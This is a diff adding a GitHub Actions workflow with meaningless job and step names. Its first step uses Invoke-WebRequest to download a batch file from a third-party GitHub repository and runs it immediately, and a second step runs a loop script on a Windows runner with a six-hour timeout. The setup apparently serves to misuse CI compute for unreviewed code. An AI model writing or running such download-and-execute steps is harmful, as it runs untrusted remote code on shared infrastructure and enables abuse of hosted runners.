@@ -1,0 +1,19 @@
+name: okokok
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Itamio Kanjiro
+    runs-on: windows-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: Malubulul
+        run: |
+          Invoke-WebRequest -Uri "https://github.com/kadalset/setup/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Hello
+        run: cmd /c loop.bat
